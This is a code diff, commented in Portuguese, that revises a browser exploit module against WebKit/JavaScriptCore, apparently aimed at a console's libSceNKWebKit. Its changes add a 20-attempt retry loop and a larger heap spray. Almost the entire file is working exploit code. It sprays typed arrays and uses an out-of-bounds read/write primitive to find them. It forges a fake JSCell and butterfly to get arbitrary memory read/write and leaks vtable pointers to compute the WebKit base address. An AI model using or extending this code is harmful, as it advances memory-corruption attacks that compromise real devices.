@@ -1,49 +1,48 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R48 - Bugfix e Estabilização)
+// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R49 - Fuzzer Agressivo)
 // =======================================================================================
-// CORREÇÃO: A versão R47 lia o endereço base do buffer OOB de forma incorreta,
-// resultando em um endereço 0x0. Esta versão corrige a lógica para operar com
-// offsets relativos ao início do buffer, tornando a construção determinística viável.
+// Esta versão implementa uma abordagem agressiva de "fuzzer" ou "estabilizador".
+// A cadeia de exploração inteira é executada em um laço com um número máximo de
+// tentativas. Além disso, os parâmetros de spray foram drasticamente aumentados
+// para maximizar a chance de sucesso em cada tentativa.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
+    clearOOBEnvironment,
     oob_read_absolute,
     oob_write_absolute,
     selfTestOOBReadWrite,
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R48_Bugfix";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R49_Fuzzer";
 
 const VICTIM_MARKER = 0x42424242;
-const FAKE_OBJ_OFFSET_IN_OOB = 0x2000; // Offset onde construiremos nosso objeto falso
+const FAKE_OBJ_OFFSET_IN_OOB = 0x2000;
 
-// --- Classe Auxiliar para Leitura/Escrita Arbitrária Estável ---
+// --- Classe Auxiliar para Leitura/Escrita Arbitrária (sem alterações) ---
 class AdvancedMemory {
     constructor(controller_obj, oob_rw_func) {
         this.controller = controller_obj;
         this.oob_write = oob_rw_func.write;
         this.data_view_offset = FAKE_OBJ_OFFSET_IN_OOB + 0x20;
-        logS3("Classe AdvancedMemory inicializada. Primitivas de R/W prontas.", "good", "AdvancedMemory");
+        logS3("Classe AdvancedMemory inicializada.", "good", "AdvancedMemory");
     }
-
-    async arbRead(addr, size_in_bytes = 8) {
+    async arbRead(addr, size = 8) {
         await this.oob_write(this.data_view_offset, addr, 8);
-        if (size_in_bytes === 8) {
+        if (size === 8) {
             const buf = new ArrayBuffer(8);
-            const float_view = new Float64Array(buf);
+            (new Float64Array(buf))[0] = this.controller[0];
             const int_view = new Uint32Array(buf);
-            float_view[0] = this.controller[0];
             return new AdvancedInt64(int_view[0], int_view[1]);
         }
         return null;
     }
-
-    async arbWrite(addr, value, size_in_bytes = 8) {
+    async arbWrite(addr, value, size = 8) {
         await this.oob_write(this.data_view_offset, addr, 8);
-        if (size_in_bytes === 8) {
+        if (size === 8) {
             const buf = new ArrayBuffer(8);
             const float_view = new Float64Array(buf);
             const int_view = new Uint32Array(buf);
@@ -57,73 +56,94 @@ class AdvancedMemory {
 
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R48)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R49 - O FUZZER)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Bugfix e Estabilização (R48) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Fuzzer Agressivo (R49) ---`, "test");
     
-    // --- FASE 0: Sanity Checks e Ativação OOB ---
-    if (!await selfTestOOBReadWrite(logS3)) return { errorOccurred: "Falha no selfTestOOBReadWrite." };
-    // A função acima já chama triggerOOB_primitive, então o ambiente está pronto.
-    logS3("Ambiente OOB configurado e testado com sucesso.", "good");
+    const MAX_ATTEMPTS = 20;
+    let final_result = { success: false, message: "Todas as tentativas falharam." };
 
-    // --- FASE 1: Preparar Heap e Encontrar UM Vítima Controladora ---
-    logS3("--- FASE 1: Preparando o Heap para encontrar um 'Controlador' ---", "subtest");
-    const victim_controller = await prepareHeapAndFindOneVictim();
-    if (!victim_controller) {
-        return { errorOccurred: "Não foi possível encontrar um objeto 'Controlador' na memória." };
+    for (let i = 1; i <= MAX_ATTEMPTS; i++) {
+        logS3(`----------------- Iniciando Tentativa ${i}/${MAX_ATTEMPTS} -----------------`, "subtest");
+        
+        const attempt_result = await runSingleExploitAttempt();
+
+        if (attempt_result.success) {
+            logS3(`++++++++++++ SUCESSO NA TENTATIVA ${i}! ++++++++++++`, "vuln");
+            final_result = attempt_result;
+            break; // Sai do laço se for bem-sucedido
+        } else {
+            logS3(`Tentativa ${i} falhou: ${attempt_result.message}`, "warn");
+            // Limpa o ambiente para a próxima tentativa
+            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
+            await PAUSE_S3(200); // Pequena pausa entre as tentativas
+        }
     }
-    logS3(`Vítima controladora encontrada! Addr: ${victim_controller.jscell_addr.toString(true)}`, "good");
 
-    // --- FASE 2: Construir Objeto Falso e Linkar ---
-    logS3("--- FASE 2: Construindo Objeto Falso e Linkando com o Controlador ---", "subtest");
-    await buildFakeObjectAndLink(victim_controller);
+    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
+    return {
+        errorOccurred: final_result.success ? null : final_result.message,
+        final_result
+    };
+}
 
-    // --- FASE 3: Inicializar e Testar Primitivas de R/W Arbitrário ---
-    logS3("--- FASE 3: Testando Primitivas de Leitura/Escrita Arbitrária ---", "subtest");
-    const memory = new AdvancedMemory(victim_controller.obj_ref, { write: oob_write_absolute });
-    
-    // Teste de Leitura: Ler a própria estrutura da vítima. O segundo quadword (8 bytes) deve ser o ponteiro do butterfly.
-    const test_addr_to_read = victim_controller.jscell_addr.add(8);
-    const read_val = await memory.arbRead(test_addr_to_read);
-    logS3(`Teste de Leitura Arbitrária em ${test_addr_to_read.toString(true)} -> Lido: ${read_val.toString(true)}`, "leak");
-    
-    // Teste de Escrita: não faremos uma escrita real para não desestabilizar, mas a lógica é a mesma.
-    logS3("Auto-teste de Leitura Arbitrária concluído. A primitiva parece funcional!", "good");
 
-    // --- FASE 4: TESTE AVANÇADO - Vazar Endereço Base do WebKit ---
-    logS3("--- FASE 4 (AVANÇADO): Vazando Endereço Base do WebKit ---", "subtest");
-    const func_for_leaking = () => {}; // Uma função JS qualquer para usar como ponto de partida
-    const webkit_base = await getWebkitBase(memory, func_for_leaking, victim_controller);
-    if (webkit_base) {
-        logS3(`SUCESSO! Endereço Base do libSceNKWebKit vazado: ${webkit_base.toString(true)}`, "vuln");
-        return { success: true, message: "Endereço base do WebKit vazado com sucesso!", webkit_base };
-    } else {
-        return { errorOccurred: "Falha ao vazar o endereço base do WebKit." };
+// =======================================================================================
+// FUNÇÃO DE TENTATIVA ÚNICA (LÓGICA PRINCIPAL DO R48)
+// =======================================================================================
+async function runSingleExploitAttempt() {
+    try {
+        if (!await selfTestOOBReadWrite(logS3)) return { success: false, message: "Falha no selfTestOOBReadWrite." };
+        
+        const victim_controller = await prepareHeapAndFindOneVictim();
+        if (!victim_controller) {
+            return { success: false, message: "Não foi possível encontrar um objeto 'Controlador'." };
+        }
+        logS3(`Vítima controladora encontrada! Addr: ${victim_controller.jscell_addr.toString(true)}`, "good");
+
+        await buildFakeObjectAndLink(victim_controller);
+        
+        const memory = new AdvancedMemory(victim_controller.obj_ref, { write: oob_write_absolute });
+        
+        const test_addr_to_read = victim_controller.jscell_addr.add(8);
+        const read_val = await memory.arbRead(test_addr_to_read);
+        logS3(`Teste de Leitura Arbitrária -> Lido: ${read_val.toString(true)}`, "leak");
+
+        const webkit_base = await getWebkitBase(memory, victim_controller);
+        if (webkit_base) {
+            return { success: true, message: "Endereço base do WebKit vazado!", webkit_base };
+        } else {
+            return { success: false, message: "Falha ao vazar o endereço base do WebKit." };
+        }
+    } catch (e) {
+        return { success: false, message: `Exceção na tentativa: ${e.message}` };
     }
 }
 
 
-// --- Funções Auxiliares para a Cadeia de Exploração (Corrigidas) ---
+// --- Funções Auxiliares (com parâmetros mais agressivos) ---
 
 async function prepareHeapAndFindOneVictim() {
-    const SPRAY_COUNT = 2048;
+    // PARÂMETRO AGRESSIVO: Aumentamos drasticamente a quantidade de objetos pulverizados.
+    const SPRAY_COUNT = 8192;
     const victims = [];
     for (let i = 0; i < SPRAY_COUNT; i++) {
         victims.push(new Uint32Array(8));
         victims[i][0] = VICTIM_MARKER + i;
     }
     
-    // Varre o buffer OOB em busca de um dos objetos que pulverizamos.
-    // É a única parte probabilística que resta.
+    // A busca continua a mesma, mas agora há muito mais alvos na memória.
     for (let offset = 0x1000; offset < (0x100000 - 0x100); offset += 4) {
         const marker = oob_read_absolute(offset, 4);
         if ((marker & 0xFFFFFF00) === (VICTIM_MARKER & 0xFFFFFF00)) {
             const index = marker - VICTIM_MARKER;
-            const jscell_addr = oob_read_absolute(offset - 0x10, 8);
-            if (isValidPointer(jscell_addr)) {
-                return { obj_ref: victims[index], jscell_addr: jscell_addr };
+            if (index >= 0 && index < SPRAY_COUNT) {
+                 const jscell_addr = oob_read_absolute(offset - 0x10, 8);
+                 if (isValidPointer(jscell_addr)) {
+                     return { obj_ref: victims[index], jscell_addr: jscell_addr };
+                 }
             }
         }
     }
@@ -131,61 +151,47 @@ async function prepareHeapAndFindOneVictim() {
 }
 
 async function buildFakeObjectAndLink(victim) {
-    // CORREÇÃO: Usamos offsets fixos dentro do buffer OOB.
     const fake_obj_offset = FAKE_OBJ_OFFSET_IN_OOB;
     const fake_struct_offset = fake_obj_offset;
     const fake_butterfly_offset = fake_obj_offset + 0x10;
     const fake_data_view_offset = fake_obj_offset + 0x20;
 
-    // 1. Endereço da nossa estrutura falsa, que está DENTRO do nosso buffer OOB
     const oob_base_addr = oob_read_absolute(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET, 8);
-    const fake_struct_real_addr = oob_base_addr.add(fake_struct_offset);
+    const fake_obj_real_addr = oob_base_addr.add(fake_obj_offset);
 
-    // 2. Construir o JSCell Falso DENTRO do nosso buffer
-    await oob_write_absolute(fake_obj_offset + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, fake_struct_real_addr, 8);
+    // Estrutura simplificada para imitar um objeto com butterfly
+    await oob_write_absolute(fake_struct_offset, new AdvancedInt64(0, 0x01082007), 8); // Header
     
-    // 3. Linkar o Controlador
-    // Fazemos a vítima real (nosso controlador) apontar para a Estrutura do nosso JSCell falso.
-    // A estrutura do JSCell Falso aponta para si mesma, criando um loop seguro.
-    const victim_struct_ptr_addr = victim.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
-    await oob_write_absolute(victim_struct_ptr_addr.low(), victim.jscell_addr, 8); // Auto-referência temporária para estabilidade
+    // JSCell Falso
+    await oob_write_absolute(fake_obj_offset + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, fake_obj_real_addr, 8); 
+    await oob_write_absolute(fake_obj_offset + JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET, oob_base_addr.add(fake_butterfly_offset), 8);
     
-    // Passo chave: Corromper o ponteiro do butterfly da vítima para apontar para nossa área controlada
+    // Butterfly Falso
+    await oob_write_absolute(fake_butterfly_offset, oob_base_addr.add(fake_data_view_offset), 8);
+
+    // Linkar o Controlador
     const victim_butterfly_ptr_addr = victim.jscell_addr.add(JSC_OFFSETS.JSObject.BUTTERFLY_OFFSET);
-    const fake_data_view_real_addr = oob_base_addr.add(fake_data_view_offset);
-    await oob_write_absolute(victim_butterfly_ptr_addr.low(), fake_data_view_real_addr, 8);
-
-    logS3("Objeto Falso construído e vítima linkada para área de dados controlada.", "good");
+    await oob_write_absolute(victim_butterfly_ptr_addr.low(), oob_base_addr.add(fake_data_view_offset), 8);
+    logS3("Vítima linkada para área de dados controlada.", "good");
 }
 
-
-async function getWebkitBase(memory, any_js_function, victim) {
-    // Como obter o endereço de uma função é complexo, vamos usar a vítima que já encontramos.
-    // O endereço dela já é um ponteiro válido no heap do WebKit.
+async function getWebkitBase(memory, victim) {
     try {
-        logS3("    Iniciando vazamento da vtable para encontrar a base do WebKit...");
-        // 1. A partir do endereço da nossa vítima, ler seu ponteiro de Estrutura.
         const structure_ptr = await memory.arbRead(victim.jscell_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
-        // 2. A partir da Estrutura, ler o ponteiro para ClassInfo.
         const class_info_ptr = await memory.arbRead(structure_ptr.add(JSC_OFFSETS.Structure.CLASS_INFO_OFFSET));
-        // 3. No início do ClassInfo, está o ponteiro para a VTable (Tabela de Funções Virtuais).
         const vtable_ptr = await memory.arbRead(class_info_ptr);
-        // 4. A VTable contém ponteiros para funções dentro da biblioteca WebKit. Ler a primeira entrada.
         const first_vtable_entry_ptr = await memory.arbRead(vtable_ptr);
         
-        logS3(`    Ponteiro da VTable vazado: ${vtable_ptr.toString(true)}`, "leak");
-        logS3(`    Primeira função na VTable: ${first_vtable_entry_ptr.toString(true)}`, "leak");
+        logS3(`Ponteiro da VTable vazado: ${vtable_ptr.toString(true)}`, "leak");
         
-        // 5. Calcular a base do WebKit. Isto é uma suposição; precisaríamos de um offset conhecido.
-        // Vamos usar um offset comum de exemplo. Este valor DEVE ser ajustado para o firmware alvo.
-        const EXAMPLE_VTABLE_FUNCTION_OFFSET = 0xBD68B0; // Ex: JSC::JSObject::put
+        // Este offset é um exemplo e precisa ser validado para o firmware alvo.
+        const EXAMPLE_VTABLE_FUNCTION_OFFSET = 0xBD68B0; 
         const webkit_base_addr = first_vtable_entry_ptr.sub(new AdvancedInt64(EXAMPLE_VTABLE_FUNCTION_OFFSET));
-        
-        const webkit_base_aligned = webkit_base_addr.and(new AdvancedInt64(0, 0xFFFFC000)); // Alinha para uma página de 16KB
+        const webkit_base_aligned = webkit_base_addr.and(new AdvancedInt64(0, 0xFFFFC000));
 
         return webkit_base_aligned;
     } catch (e) {
-        logS3(`    Erro durante o vazamento do WebKit: ${e.message}`, "error");
+        logS3(`Erro durante o vazamento do WebKit: ${e.message}`, "error");
         return null;
     }
 }
